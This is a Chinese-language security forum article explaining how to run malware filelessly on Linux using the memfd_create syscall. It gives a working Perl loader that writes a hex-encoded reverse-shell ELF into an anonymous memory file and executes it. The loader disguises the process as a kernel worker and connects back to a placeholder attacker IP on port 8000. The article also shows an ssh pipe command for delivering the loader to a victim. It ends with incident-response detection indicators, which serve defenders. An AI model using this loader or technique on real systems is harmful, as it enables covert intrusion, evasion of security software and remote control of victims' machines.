# 利用memfd_create实现无文件攻击

> **来源**: https://forum.butian.net/share/3069  
> **文章ID**: 3069

---

### 概述

当下无文件（fileless）攻击已经越来越流行，由于其无文件执行比较隐蔽和难检测，广受攻击者的喜欢，该植入后门的过程不涉及新文件写入磁盘，也没有修改已有文件，因此可以绕过绝大部分安全软件。另外许多Linux系统会自带各种调试工具、解释程序、编译器和程序库，这些都可以帮助攻击者实现无文件技术隐蔽执行。然而，无文件执行也有一些缺点，就是重启后自动消失，因此需要考虑其他持久化的方式。本文介绍一种利用memfd\_create实现无文件攻击的思路。

memfd\_create 是 Linux 中的一个系统调用，用于创建一个内存文件描述符。这个文件描述符可以用于共享内存、匿名内存映射或其他与文件无关的 I/O 操作，首先看下Linux官方手册中关于memfd\_create的解释

> # include <sys/mman.h>
> 
> int memfd\_create(const char \*name, unsigned int flags);

参数：  
name：一个可选的名称，用于标识这个内存文件描述符。如果设置为 NULL，则使用默认名称。  
flags：用于指定创建的内存文件描述符的特性。例如，可以使用 MFD\_CLOEXEC 和 MFD\_ALLOW\_SEALING 等标志。  
该函数在内核3.17版本中引入，会创建一个匿名文件并返回一个文件描述符指向它，该文件表现和常规文件类同， 可以进行修改，截断，内存映射等等，但不同的是，它存在于RAM当中。在函数描述中有这样如下一段话

> The name supplied in name is used as a filename and will be  
> displayed as the target of the corresponding symbolic link in the  
> directory /proc/self/fd/. The displayed name is always prefixed  
> with memfd: and serves only for debugging purposes. Names do not  
> affect the behavior of the file descriptor, and as such multiple  
> files can have the same name without any side effects.

大致意思是memfd\_create函数中的文件名参数将会在/proc/self/fd/中作为目标指向以符号链接形式显示出来，显示的名称始终以memfd为前缀，并且仅用于调试目的。文件名不影响文件描述符的行为，同时多个文件可以有相同的文件名，不会产生副作用。

### 实现流程

上一节中我们了解了memfd\_create函数的详情，下面就介绍下如何利用memfd\_create进行无文件攻击，大致流程如下。

1. 使用memfd\_create函数创建一个在内存中的匿名文件。name参数给定一个自定义的名称，也可以为空。
2. 处理返回值，memfd\_create函数会返回一个新的文件描述符。如果返回-1，那就意味着出现了错误，你需要检查并处理error。另外可以打印下/proc/self/fd/中的的文件描述符。
3. 映射内存，一旦获取一个文件描述符，使用mmap函数将其映射到进程的地址空间。即用Perl中的open()函数从获取的文件描述符创建文件句柄。
4. 将ELF二进制数据写入匿名文件。
5. 使用execve()执行ELF二进制文件，路径为文件描述符符号链接。
6. 当你完成了对内存的读写操作后，你需要使用munmap函数解除映射，然后使用close函数关闭文件描述符。

memfd\_create()调用时需要传入两个参数，一个是文件名，一个是MFD\_CLOEXEC标志（类似于O\_CLOEXEC），以便当我们执行ELF二进制文件时，得到的文件描述符将会自动关闭。因此我们使用perl传递memfd\_create的原始系统调用号和MEMFD\_CLOEXEC的数字常量， 这两个都可以在/usr/include的头文件中找到。 系统调用号码存储在以\_NR开头的#define中。

> root@ubuntu:/usr/include# egrep -r '\_\_NR\_memfd\_create|MFD\_CLOEXEC' \*  
> ![](images/1706537974542-81bdf784-cb1e-4618-9bb5-4b478339cdd2.png)

这里我们已经获取到了memfd\_create的系统调用码（在64位操作系统中为319）和MFD\_CLOEXEC（0x0001U），这时候我们就可以使用perl的syscall函数来调用memfd\_create。

fd = syscall(319, $name, MFD\_CLOEXEC))  
也等价于  
fd = memfd\_create($name, MFD\_CLOEXEC)

现在我们有了文件描述符号存储在变量**$fd** 中。接下来将其用perl命令执行，如下命令显示在创建匿名文件后文件描述符。

> root@ubuntu:~/memfd\_shell# perl -e '$n="";die$!if-1==syscall(319,$n,1);print`ls -l /proc/$$/fd`'

![](images/1706622293128-abe92002-4ced-479b-84e3-688152b268d8.png)

#### write

现在我们有了一个匿名文件描述符号，接下来需要写入恶意的ELF文件。首先，我们需要从文件描述符中获取一个Perl文件句柄，然后我们需要将我们的数据转换为可写的格式，最后将其写入内存。  
Perl通常用于**open()**函数打开文件，如果要在新文件句柄上启用自动刷新，需要指定>&=和| autoflush选项。如下代码，将一个已打开的文件描述符（$fd）转换为一个文件句柄（$FH），并启用自动刷新。

```php
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
```

接下来，我们需要用Perl处理ELF文件，如下代码，读取一个 ELF文件，并对其内容进行处理或提取，将文件中的字符串转换为可执行的Perl代码片段。

```php
perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' ./memfd_nc
```

![](images/1706624012727-a5c348e1-6f74-4c87-b9c2-7f43ba6ade66.png)

#### exec

接下来就是执行该文件，即调用exec函数执行该匿名文件，完整代码如下

```php
#!/usr/bin/env perl
use warnings;
use strict;
$|=1;
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) {
        die "memfd_create: $!";
}
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
print "Writing ELF binary to memory...";

#反弹shell代码
print $FH pack q/H*/, q/72726f722c6572726f7200676f2e697461622e2a636f6e746578742e63616e63/ or die qq/write: $!/;
print $FH pack q/H*/, q/656c4374782c636f6e746578742e63616e63656c657200676f2e697461622e2a/ or die qq/write: $!/;
print $FH pack q/H*/, q/636f6e746578742e63616e63656c4374782c636f6e746578742e436f6e746578/ or die qq/write: $!/;
....

#
exec {"/proc/$$/fd/$fd"} "[kworded/0:0]", "-addr", "攻击主机IP:8000" or die "exec: $!";
```

然后在攻击主机上执行如下命令，即可在受害主机上写入无文件后门。

cat demoshell.pl | ssh kali@172.17.10.43 /bin/bash -c 'perl'

如下攻击机器上的特征：

![](images/1706708722766-ecaf2cba-9fd4-4b92-9a65-56bd29ee9f9a.png)

![](images/1706708736472-352c6165-a18d-43ec-b64e-7938fe7eb35f.png)

受害机器机器上的特征：

![](images/1706708949604-b4f79001-f7d4-48f8-88d6-b638239f09e2.png)

![](images/1706708976312-7fa45a29-c9ac-4e25-8532-01c6611666f0.png)

### 入侵检测特征

在对Linux系统进行应急时，一般会查看进程的上下文信息，在Linux中进程的信息都在/proc/目录下，我们先了解下/proc/目录下部分文件的含义，其他文件可以自行查询含义，在IR中用的比较少。

/proc/pid/exe 这是一个符号链接，指向进程的二进制文件。

/proc/pid/fd/ 进程打开的文件描述符的目录

/proc/pid/mem 进程在内存中的内容

/proc/pid/stat 进程的状态信息

/proc/pid/statm 进程的内存使用信息

/proc/pid/cmdline 显示启动进程时使用的命令行

/proc/pid/task 显示进程的各个线程的信息

/proc/pid/net: 与网络相关的信息

/proc/pid/map\_files 与文件映射有关的信息

上一节写无文件的思路可以通过如下命令进行检测：

ls -alR /proc/\*/exe 2> /dev/null | grep memfd:.\*(deleted)

该命令会遍历/proc目录中所有正在运行的进程，检查它们的路径是否指向memfd:（deleted）。该路径比较可疑，且在无文件攻击中很常见。

![](images/1706709382115-aab15015-9808-4d3b-b18a-11b91fbb9cd3.png)

另外我们看下comm和cmdline命令不一样，comm通常是一个数字。

![](images/1706709992961-6c61de24-033f-4850-8b11-88d910bf9703.png)

maps文件中也有"memfd:.\*(deleted)" 字符

![](images/1706710034656-1bce75d7-d86d-451a-bb84-ac592861f803.png)

最后再说一个辅助排查的特征，进程环境变量，上述写无文件的方式中可以看到ssh连接。

![](images/1706710125608-2e1019de-8184-4b70-b676-624ea279a737.png)

### 参考资料

<https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html>

[https://man7.org/linux/man-pages/man2/memfd\_create.2.html](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
